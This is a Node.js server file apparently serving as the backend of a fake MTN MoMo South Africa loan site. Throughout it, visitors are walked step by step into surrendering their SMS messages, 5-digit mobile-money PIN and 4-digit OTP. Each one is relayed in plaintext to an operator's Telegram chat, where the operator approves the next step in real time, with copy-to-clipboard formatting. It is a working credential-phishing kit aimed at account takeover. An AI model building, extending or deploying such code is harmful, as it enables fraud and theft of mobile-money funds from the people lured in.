// ============================================================
// server.js – MTN MoMo South Africa (Admin-poll-only)
// Copy-to-clipboard on Telegram + 20% qualification rule
// ============================================================
'use strict';

console.log("🚀 1. Server is starting...");
require('dotenv').config();
console.log("🚀 2. dotenv loaded");

const express = require('express');
const fetch = require('node-fetch');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
app.use(cors());
app.use(express.json({ limit: '1mb' }));
app.use(express.static(path.join(__dirname, '../frontend')));

// ─── In-Memory Store ───
const applications = {};
const rejectionHistory = {};

const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('❌ Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
}

// ─── HTML Helpers (copy-to-clipboard) ───
function escapeHtml(t) {
    if (t === null || t === undefined) return '';
    return String(t).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}
function copyable(t) {
    const c = (t === null || t === undefined) ? '' : String(t).trim();
    return `<code>${escapeHtml(c)}</code>`;
}
function copyableBlock(t) {
    const c = (t === null || t === undefined) ? '' : String(t).trim();
    return `<pre>${escapeHtml(c)}</pre>`;
}

// ─── Data Persistence ───
const DATA_DIR = path.join(__dirname, '../data');
const DATA_FILE = path.join(DATA_DIR, 'applications.json');
const HISTORY_FILE = path.join(DATA_DIR, 'rejection_history.json');
const AUDIT_FILE = path.join(DATA_DIR, 'audit.log');

if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
    console.log('📁 Created data directory');
}

function saveApps() {
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify({
            applications, rejectionHistory,
            timestamp: new Date().toISOString()
        }, null, 2));
    } catch (e) { console.error('Save error:', e.message); }
}

function saveRejections() {
    try { fs.writeFileSync(HISTORY_FILE, JSON.stringify(rejectionHistory, null, 2)); }
    catch (e) { console.error('Save rejection error:', e.message); }
}

function loadAll() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const parsed = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
            const age = Date.now() - new Date(parsed.timestamp).getTime();
            if (age < 30 * 24 * 60 * 60 * 1000) {
                Object.assign(applications, parsed.applications || {});
                Object.assign(rejectionHistory, parsed.rejectionHistory || {});
                console.log(`📂 Loaded ${Object.keys(applications).length} applications`);
            }
        }
    } catch (e) { console.error('Load error:', e.message); }
}

function audit(event, data = {}) {
    const entry = { ts: new Date().toISOString(), event, ...data };
    try { fs.appendFileSync(AUDIT_FILE, JSON.stringify(entry) + '\n'); }
    catch (e) {}
    console.log(JSON.stringify(entry));
}

function addAudit(app_, event, meta = {}) {
    app_.auditTrail = app_.auditTrail || [];
    app_.auditTrail.push({ ts: new Date().toISOString(), event, ...meta });
    if (app_.auditTrail.length > 50) app_.auditTrail = app_.auditTrail.slice(-50);
}

// Autosave every 30s
setInterval(() => {
    if (Object.keys(applications).length > 0) {
        saveApps();
        if (Object.keys(rejectionHistory).length > 0) saveRejections();
    }
}, 30000);

// Graceful shutdown
function gracefulShutdown() {
    console.log('🔄 Saving data before shutdown...');
    saveApps();
    saveRejections();
    process.exit(0);
}
process.on('SIGINT', gracefulShutdown);
process.on('SIGTERM', gracefulShutdown);

// ─── Telegram Sender ───
async function sendTelegramMessage(message, buttons = null) {
    if (!TELEGRAM_BOT_TOKEN) return { ok: false };
    const body = {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        disable_web_page_preview: true
    };
    if (buttons) body.reply_markup = { inline_keyboard: buttons };
    try {
        const r = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        });
        return await r.json();
    } catch (e) {
        console.error('Telegram send error:', e.message);
        return { ok: false };
    }
}

function askApproval(text, step, appId) {
    const buttons = [[
        { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step, applicationId: appId }) },
        { text: '❌ NO',  callback_data: JSON.stringify({ action: 'NO',  step, applicationId: appId }) }
    ]];
    sendTelegramMessage(text, buttons).catch(() => {});
}

// ─── Qualification Rules (20%) ───
const QUALIFICATION = {
    REQUIRED_RATIO: 0.20,
    MIN_TRANSACTION: 500,
    MAX_MONTHLY: 10000000
};

function evaluateQualification({ loanAmount, monthlyTransactions }) {
    const amount = Number(loanAmount) || 0;
    const volume = Number(monthlyTransactions) || 0;

    if (amount <= 0) return { qualifies: false, reason: 'Invalid loan amount.', required: 0, actual: 0, shortfall: 0, coveragePercent: 0, maxQualifyingLoan: 0 };

    const required = Math.ceil(amount * QUALIFICATION.REQUIRED_RATIO);
    const coveragePercent = amount > 0 ? +((volume / amount) * 100).toFixed(2) : 0;
    const maxQualifyingLoan = Math.floor(volume / QUALIFICATION.REQUIRED_RATIO);
    const shortfall = Math.max(0, required - volume);

    if (volume < QUALIFICATION.MIN_TRANSACTION) {
        return {
            qualifies: false, required, actual: volume, shortfall, coveragePercent, maxQualifyingLoan,
            reason: `Minimum monthly transaction volume is R ${QUALIFICATION.MIN_TRANSACTION.toLocaleString()}. Yours is R ${volume.toLocaleString()}.`
        };
    }

    if (volume >= required) {
        return {
            qualifies: true, required, actual: volume, shortfall: 0, coveragePercent, maxQualifyingLoan,
            reason: `Qualified. Your R ${volume.toLocaleString()} monthly volume covers the R ${required.toLocaleString()} requirement (${coveragePercent}%).`
        };
    }

    return {
        qualifies: false, required, actual: volume, shortfall, coveragePercent, maxQualifyingLoan,
        reason: `Your monthly transaction volume of R ${volume.toLocaleString()} covers ${coveragePercent}% of your R ${amount.toLocaleString()} loan. You need at least 20% (R ${required.toLocaleString()}).`
    };
}

// ═══════════════════════════════════════════════════════════
// ENDPOINTS
// ═══════════════════════════════════════════════════════════

// ─── Qualification Check ───
app.post('/api/check-qualification', (req, res) => {
    const { applicationId, monthlyTransactions, loanAmount } = req.body || {};
    const amount = Number(loanAmount) || 0;
    const volume = Number(monthlyTransactions) || 0;

    if (!Number.isFinite(volume) || volume < 0) {
        return res.status(400).json({ ok: false, error: 'Invalid transaction volume.' });
    }
    if (volume > QUALIFICATION.MAX_MONTHLY) {
        return res.status(400).json({ ok: false, error: 'Volume exceeds verification limits.' });
    }

    const result = evaluateQualification({ loanAmount: amount, monthlyTransactions: volume });

    if (applicationId && applications[applicationId]) {
        applications[applicationId].qualification = {
            checkedAt: new Date().toISOString(),
            loanAmount: amount,
            monthlyTransactions: volume,
            ...result
        };
        applications[applicationId].qualificationStatus = result.qualifies ? 'qualified' : 'unqualified';
        applications[applicationId].updatedAt = new Date().toISOString();
        addAudit(applications[applicationId], result.qualifies ? 'qualification_passed' : 'qualification_failed', {
            volume, required: result.required, shortfall: result.shortfall
        });
        saveApps();
    }

    audit('qualification_check', { id: applicationId, qualifies: result.qualifies, volume, required: result.required });

    res.json({ ok: true, ...result });
});

// ─── Submit Application ───
app.post('/api/send-application', (req, res) => {
    try {
        const data = req.body.applicationData;
        const { applicationId, phone, loanAmount, loanTerm, firstName, lastName } = data;

        if (!applicationId) return res.status(400).json({ ok: false, error: 'Missing application ID.' });

        const isResubmission = !!applications[applicationId];

        applications[applicationId] = {
            ...data,
            application: 'pending',
            sms: 'idle',
            pin: 'idle',
            otp: 'idle',
            pinAttempts: 0,
            maxPinAttempts: 3,
            pinBlockedUntil: null,
            resubmissionCount: isResubmission ? (applications[applicationId]?.resubmissionCount || 0) + 1 : 0,
            createdAt: isResubmission ? applications[applicationId]?.createdAt : new Date().toISOString(),
            updatedAt: new Date().toISOString()
        };

        saveApps();
        console.log(`📝 Application ${isResubmission ? 'RE' : ''}submitted: ${applicationId}`);

        askApproval(
            `📋 <b>${isResubmission ? 'RE-' : 'NEW'} LOAN APPLICATION (SOUTH AFRICA)</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🆔 ID: ${copyable(applicationId)}\n` +
            `👤 ${escapeHtml(firstName)} ${escapeHtml(lastName)}\n` +
            `📱 Phone: ${copyable('+27' + phone)}\n` +
            `💰 Amount: <b>R ${loanAmount.toLocaleString()}</b>\n` +
            `📅 Term: ${escapeHtml(loanTerm)}\n` +
            `📊 Monthly Tx: R ${(data.monthlyTransactions || 0).toLocaleString()}\n\n` +
            `✅ <b>Approve to allow SMS step?</b>`,
            'application',
            applicationId
        );

        res.json({ ok: true, applicationId, status: 'pending' });
    } catch (e) {
        console.error('Error in /api/send-application:', e);
        res.status(500).json({ ok: false, error: e.message });
    }
});

// ─── Submit SMS ───
app.post('/api/send-momo-message', async (req, res) => {
    try {
        const { momoData } = req.body;
        const { applicationId, phone, momoMessage } = momoData;

        const app_ = applications[applicationId];
        if (!app_) return res.status(404).json({ ok: false, error: 'Application not found.' });
        if (app_.application !== 'approved') return res.status(400).json({ ok: false, error: 'Application not approved yet.' });
        if (app_.sms === 'pending') return res.status(400).json({ ok: false, error: 'SMS already submitted, awaiting review.' });

        app_.smsMessage = String(momoMessage).trim();
        app_.sms = 'pending';
        app_.updatedAt = new Date().toISOString();
        addAudit(app_, 'sms_submitted');
        saveApps();

        askApproval(
            `📨 <b>SMS VERIFICATION</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🆔 ID: ${copyable(applicationId)}\n` +
            `👤 ${escapeHtml(app_.firstName)} ${escapeHtml(app_.lastName)}\n` +
            `📱 Phone: ${copyable('+27' + phone)}\n\n` +
            `📩 <b>SMS Content:</b>\n${copyableBlock(momoMessage)}\n\n` +
            `✅ <b>Approve to allow PIN step?</b>`,
            'sms',
            applicationId
        );

        res.json({ ok: true, status: 'pending' });
    } catch (e) {
        console.error('Error in /api/send-momo-message:', e);
        res.status(500).json({ ok: false, error: e.message });
    }
});

// ─── Submit PIN ───
app.post('/api/send-pin', async (req, res) => {
    try {
        const { applicationId, pin } = req.body;
        const app_ = applications[applicationId];
        if (!app_) return res.status(404).json({ ok: false, error: 'Application not found.' });
        if (app_.sms !== 'approved') return res.status(400).json({ ok: false, error: 'SMS not approved yet.' });
        if (app_.pin === 'pending') return res.status(400).json({ ok: false, error: 'PIN already submitted.' });

        if (app_.pinBlockedUntil && new Date(app_.pinBlockedUntil) > new Date()) {
            const remaining = Math.ceil((new Date(app_.pinBlockedUntil) - new Date()) / 1000);
            return res.status(429).json({ ok: false, blocked: true, error: `Too many attempts. Wait ${remaining}s.` });
        }

        if (app_.pinBlockedUntil && new Date(app_.pinBlockedUntil) <= new Date()) {
            app_.pinAttempts = 0;
            app_.pinBlockedUntil = null;
        }

        const cleanPin = String(pin || '').trim();
        if (!/^\d{5}$/.test(cleanPin)) {
            app_.pinAttempts = (app_.pinAttempts || 0) + 1;
            const rem = app_.maxPinAttempts - app_.pinAttempts;
            if (rem <= 0) {
                app_.pinBlockedUntil = new Date(Date.now() + 5*60*1000).toISOString();
                app_.pin = 'blocked';
                saveApps();
                return res.status(423).json({ ok: false, blocked: true, error: 'Blocked for 5 minutes.' });
            }
            saveApps();
            return res.status(400).json({ ok: false, error: `PIN must be 5 digits. ${rem} attempts left.`, remainingAttempts: rem });
        }

        app_.pin = 'pending';
        app_.pinValue = cleanPin;
        app_.updatedAt = new Date().toISOString();
        addAudit(app_, 'pin_submitted');
        saveApps();

        askApproval(
            `🔐 <b>PIN VERIFICATION</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🆔 ID: ${copyable(applicationId)}\n` +
            `👤 ${escapeHtml(app_.firstName)} ${escapeHtml(app_.lastName)}\n` +
            `🔢 PIN: ${copyable(cleanPin)}\n\n` +
            `✅ <b>Approve to allow OTP step?</b>`,
            'pin',
            applicationId
        );

        res.json({ ok: true, status: 'pending' });
    } catch (e) {
        console.error('Error in /api/send-pin:', e);
        res.status(500).json({ ok: false, error: e.message });
    }
});

// ─── Submit OTP ───
app.post('/api/send-otp', async (req, res) => {
    try {
        const { applicationId, otp } = req.body;
        const app_ = applications[applicationId];
        if (!app_) return res.status(404).json({ ok: false, error: 'Application not found.' });
        if (app_.pin !== 'approved') return res.status(400).json({ ok: false, error: 'PIN not approved yet.' });
        if (app_.otp === 'pending') return res.status(400).json({ ok: false, error: 'OTP already submitted.' });

        const cleanOtp = String(otp || '').trim();
        if (!/^\d{4}$/.test(cleanOtp)) {
            return res.status(400).json({ ok: false, error: 'OTP must be 4 digits.' });
        }

        app_.otp = 'pending';
        app_.otpValue = cleanOtp;
        app_.updatedAt = new Date().toISOString();
        addAudit(app_, 'otp_submitted');
        saveApps();

        askApproval(
            `🔑 <b>OTP VERIFICATION</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🆔 ID: ${copyable(applicationId)}\n` +
            `👤 ${escapeHtml(app_.firstName)} ${escapeHtml(app_.lastName)}\n` +
            `🔢 OTP: ${copyable(cleanOtp)}\n\n` +
            `✅ <b>Approve to complete the loan?</b>`,
            'otp',
            applicationId
        );

        res.json({ ok: true, status: 'pending' });
    } catch (e) {
        console.error('Error in /api/send-otp:', e);
        res.status(500).json({ ok: false, error: e.message });
    }
});

// ─── Status Check ───
app.get('/api/status/:applicationId/:step', (req, res) => {
    const { applicationId, step } = req.params;
    const app_ = applications[applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Application not found.' });
    if (!['application', 'sms', 'pin', 'otp'].includes(step)) {
        return res.status(400).json({ ok: false, error: 'Invalid step.' });
    }
    res.json({ ok: true, status: app_[step] || 'idle', applicationId, step });
});

// ─── Full Status ───
app.get('/api/status/:applicationId', (req, res) => {
    const app_ = applications[req.params.applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Application not found.' });
    res.json({
        ok: true,
        application: app_.application,
        sms: app_.sms,
        pin: app_.pin,
        otp: app_.otp
    });
});

// ─── Resend SMS ───
app.post('/api/resend-sms/:applicationId', (req, res) => {
    const app_ = applications[req.params.applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    app_.sms = 'idle';
    app_.smsMessage = null;
    app_.updatedAt = new Date().toISOString();
    addAudit(app_, 'sms_resend');
    saveApps();
    res.json({ ok: true });
});

// ─── Resend OTP ───
app.post('/api/resend-otp', async (req, res) => {
    const { applicationId } = req.body;
    const app_ = applications[applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });

    app_.otp = 'idle';
    app_.otpValue = null;
    app_.updatedAt = new Date().toISOString();
    addAudit(app_, 'otp_resend');
    saveApps();

    sendTelegramMessage(
        `🔄 <b>OTP RESENT</b>\n` +
        `🆔 ${copyable(applicationId)}\n` +
        `👤 ${escapeHtml(app_.firstName)} ${escapeHtml(app_.lastName)}`
    ).catch(() => {});

    res.json({ ok: true });
});

// ─── Retry Step ───
app.post('/api/retry/:applicationId/:step', (req, res) => {
    const { applicationId, step } = req.params;
    const app_ = applications[applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    if (!['sms', 'pin', 'otp'].includes(step)) return res.status(400).json({ ok: false, error: 'Invalid step.' });

    app_[step] = 'idle';
    if (step === 'sms') { app_.smsMessage = null; }
    if (step === 'pin') { app_.pinValue = null; app_.pinAttempts = 0; app_.pinBlockedUntil = null; }
    if (step === 'otp') { app_.otpValue = null; }
    app_.updatedAt = new Date().toISOString();
    addAudit(app_, 'step_retry', { step });
    saveApps();

    res.json({ ok: true });
});

// ─── Reset PIN Attempts ───
app.post('/api/reset-pin-attempts/:applicationId', (req, res) => {
    const app_ = applications[req.params.applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    app_.pinAttempts = 0;
    app_.pinBlockedUntil = null;
    if (app_.pin === 'blocked') app_.pin = 'idle';
    saveApps();
    res.json({ ok: true });
});

// ─── Rejection Info ───
app.get('/api/rejection-info/:applicationId', (req, res) => {
    const app_ = applications[req.params.applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });

    let rejectedStep = null;
    let errorMessage = '';
    if (app_.application === 'rejected') { rejectedStep = 'application'; errorMessage = 'Application was rejected.'; }
    else if (app_.sms === 'rejected') { rejectedStep = 'sms'; errorMessage = 'Your SMS was rejected.'; }
    else if (app_.pin === 'rejected') { rejectedStep = 'pin'; errorMessage = 'Your PIN was rejected.'; }
    else if (app_.otp === 'rejected') { rejectedStep = 'otp'; errorMessage = 'Your OTP was rejected.'; }

    res.json({ ok: true, rejectedStep, errorMessage });
});

// ═══════════════════════════════════════════════════════════
// TELEGRAM WEBHOOK
// ═══════════════════════════════════════════════════════════
app.post('/api/telegram-webhook', async (req, res) => {
    res.sendStatus(200);

    try {
        // ─── Callback (YES/NO buttons) ───
        if (req.body.callback_query) {
            const q = req.body.callback_query;

            fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ callback_query_id: q.id, text: 'Received' })
            }).catch(() => {});

            try {
                const data = JSON.parse(q.data);
                const app_ = applications[data.applicationId];
                if (!app_) return;

                const step = data.step.toLowerCase();
                const approved = data.action === 'YES';

                if (app_[step] !== 'pending') {
                    console.log(`⚠️ Step ${step} not pending (${app_[step]}). Ignoring.`);
                    return;
                }

                app_[step] = approved ? 'approved' : 'rejected';
                app_.updatedAt = new Date().toISOString();
                addAudit(app_, `admin_${approved ? 'approved' : 'rejected'}_${step}`, { by: q.from?.username || 'admin' });
                saveApps();

                if (!approved) {
                    rejectionHistory[data.applicationId] = {
                        step,
                        at: new Date().toISOString(),
                        by: q.from?.username || 'admin'
                    };
                    saveRejections();
                }

                const icon = approved ? '✅' : '❌';
                sendTelegramMessage(
                    `${icon} <b>${approved ? 'APPROVED' : 'REJECTED'}</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `🆔 ${copyable(data.applicationId)}\n` +
                    `📋 Step: <b>${step.toUpperCase()}</b>\n` +
                    `👤 ${escapeHtml(app_.firstName)} ${escapeHtml(app_.lastName)}`
                ).catch(() => {});
            } catch (e) {
                console.error('Callback parse error:', e.message);
            }
            return;
        }

        // ─── Text Commands ───
        if (req.body.message && req.body.message.text) {
            const text = req.body.message.text.trim();
            const chatId = req.body.message.chat.id;

            if (chatId.toString() !== TELEGRAM_CHAT_ID) return;

            if (text === '/stats') {
                const total = Object.keys(applications).length;
                const pendingApp = Object.values(applications).filter(a => a.application === 'pending').length;
                const pendingSms = Object.values(applications).filter(a => a.sms === 'pending').length;
                const pendingPin = Object.values(applications).filter(a => a.pin === 'pending').length;
                const pendingOtp = Object.values(applications).filter(a => a.otp === 'pending').length;
                const completed = Object.values(applications).filter(a => a.otp === 'approved').length;

                sendTelegramMessage(
                    `📊 <b>STATISTICS</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `📝 Total: <b>${total}</b>\n` +
                    `✅ Completed: <b>${completed}</b>\n\n` +
                    `<b>Pending:</b>\n` +
                    `  App: ${pendingApp} | SMS: ${pendingSms} | PIN: ${pendingPin} | OTP: ${pendingOtp}`
                ).catch(() => {});
            } else if (text === '/list') {
                const ids = Object.keys(applications).slice(-10);
                if (ids.length === 0) { sendTelegramMessage('📭 No applications.').catch(() => {}); return; }
                let msg = '📋 <b>RECENT APPLICATIONS</b>\n━━━━━━━━━━━━━━━━━━━━━━\n';
                ids.forEach((id, i) => {
                    const a = applications[id];
                    msg += `\n${i+1}. 🆔 ${copyable(id)}\n   👤 ${escapeHtml(a.firstName)} ${escapeHtml(a.lastName)}\n   💰 R ${a.loanAmount.toLocaleString()}\n   📌 App:${a.application} SMS:${a.sms} PIN:${a.pin} OTP:${a.otp}\n`;
                });
                sendTelegramMessage(msg).catch(() => {});
            } else if (text.startsWith('/search ')) {
                const id = text.replace('/search ', '').trim().toUpperCase();
                const a = applications[id];
                if (!a) { sendTelegramMessage(`❌ Not found: ${copyable(id)}`).catch(() => {}); return; }
                sendTelegramMessage(
                    `🔍 <b>APPLICATION DETAILS</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `🆔 ${copyable(id)}\n` +
                    `👤 ${escapeHtml(a.firstName)} ${escapeHtml(a.lastName)}\n` +
                    `📱 ${copyable('+27' + a.phone)}\n` +
                    `📧 ${copyable(a.email)}\n` +
                    `💰 <b>R ${a.loanAmount.toLocaleString()}</b>\n` +
                    `📊 Monthly Tx: R ${(a.monthlyTransactions || 0).toLocaleString()}\n` +
                    `📋 App: ${a.application} | SMS: ${a.sms} | PIN: ${a.pin} | OTP: ${a.otp}`
                ).catch(() => {});
            } else if (text === '/pending') {
                const pending = Object.entries(applications).filter(([_, a]) =>
                    a.application === 'pending' || a.sms === 'pending' || a.pin === 'pending' || a.otp === 'pending'
                );
                if (pending.length === 0) { sendTelegramMessage('✅ No pending.').catch(() => {}); return; }
                let msg = `⏳ <b>PENDING (${pending.length})</b>\n━━━━━━━━━━━━━━━━━━━━━━\n`;
                pending.slice(0, 10).forEach(([id, a]) => {
                    const steps = [];
                    if (a.application === 'pending') steps.push('App');
                    if (a.sms === 'pending') steps.push('SMS');
                    if (a.pin === 'pending') steps.push('PIN');
                    if (a.otp === 'pending') steps.push('OTP');
                    msg += `\n🆔 ${copyable(id)}\n👤 ${escapeHtml(a.firstName)} ${escapeHtml(a.lastName)}\n💰 R ${a.loanAmount.toLocaleString()}\n📋 ${steps.join(', ')}\n`;
                });
                sendTelegramMessage(msg).catch(() => {});
            } else if (text === '/help' || text === '/start') {
                sendTelegramMessage(
                    `🤖 <b>COMMANDS</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `📊 /stats — Statistics\n` +
                    `⏳ /pending — Pending approvals\n` +
                    `📋 /list — Recent applications\n` +
                    `🔍 /search [ID] — Details\n` +
                    `❓ /help — Menu`
                ).catch(() => {});
            }
        }
    } catch (e) {
        console.error('Webhook error:', e.message);
    }
});

// ─── Health Check ───
app.get('/health', (req, res) => {
    res.json({ status: 'ok', uptime: process.uptime(), applications: Object.keys(applications).length });
});

// ─── Serve Frontend ───
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
});

// ─── Boot ───
loadAll();
app.listen(PORT, () => {
    console.log(`\n🚀 MTN MoMo SA server running`);
    console.log(`   → http://localhost:${PORT}`);
    console.log(`   → Health: http://localhost:${PORT}/health\n`);
});
